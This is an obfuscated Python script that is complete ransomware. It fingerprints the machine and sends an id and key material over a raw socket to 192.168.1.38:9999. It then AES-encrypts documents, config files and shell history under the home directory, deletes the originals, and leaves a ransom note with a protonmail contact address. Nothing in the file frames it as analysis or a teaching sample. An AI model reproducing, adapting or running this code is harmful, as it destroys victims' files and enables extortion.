#!/usr/bin/env python3
l=exit
import sys
z=sys.platform
import os
J=os.walk
T=os.remove
S=os.environ
import platform
h=platform.system
E=platform.machine
e=platform.platform
X=platform.node
import hashlib
a=hashlib.sha256
import string
C=string.ascii_letters
O=0
N=1
G=2
g=('192.168.1.38',9999)
def pad(u):
 y=16-(len(u)%16)
 u+=bytes([y])*y
 return u
def w(u):
 u=u[:-u[-1]]
 return u
U=['.doc','.txt','.rc','.ini','.dat','.conf','_history']
class V():
 def __init__(Q):
  f=X()+'//'+e()
  d=S['HOME']
  P=d.split('/')[-1]
  v=E()
  D=h()
  if not d:
   import getpass
   P=getpass.getuser()
   d='/home/'+P
  b=':'.join(x for x in[f,v,D,P,d])
  Q.id=a(b.encode('utf8')).hexdigest()
  Q.system=D
  Q.machine=v
  Q.user=P
  Q.home=d
  if "linux" in z:
   Q.platform=O
  elif "darwin" in z:
   Q.platform=N
  elif "win32" in z:
   Q.platform=G
  try:
   f=open('/tmp/.X11.'+Q.id,'r')
   Q.inf=True
  except FileNotFoundError:
   f=open('/tmp/.X11.'+Q.id,'w')
   Q.inf=False
   f.write(Q.id)
  f.close()
 def r(Q,c,fl):
    import os
    J=os.walk
    T=os.remove
    S=os.environ
    try:
         f=open(fl,'rb')
         d=f.read()
         f.close()
         d=pad(d)
         q=c.encrypt(d)
         f=open(fl+'.enc','wb')
         f.write(q)
         f.close()
         T(fl)
    except:
        pass
 def t(Q):
  import socket
  import random
  import base64
  M=[]
  for x in range(16):
   p=''.join(random.choices(string.ascii_letters,k=16))
   M.append(p)
  u=','.join(k for k in M)
  u=bytes(u,"utf-8")
  u=base64.b64encode(u)
  s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
  s.connect(g)
  s.sendall(bytes(Q.id,"utf-8"))
  s.recv(1)
  s.sendall(u)
  from Crypto.Cipher import AES
  c=AES.new(p,AES.MODE_ECB)
  for(dirpath,dirnames,filenames)in J(Q.home):
   if '.ssh' not in dirnames:
    for fn in filenames:
     for e in U:
      if fn.endswith(e):
       Q.r(c,dirpath+'/'+fn)
       break
  f=open(Q.home+'/message','wb')
  f.write(bytes('All your files was encrypted\n. Contact Ywe23z3565yrgbv@protonmail.com for information(mention IP address on theme)\n','utf-8'))
  f.close()
k=V()
if k.platform!=O:
 exit(-1)
if k.inf:
 exit(0)
k.t()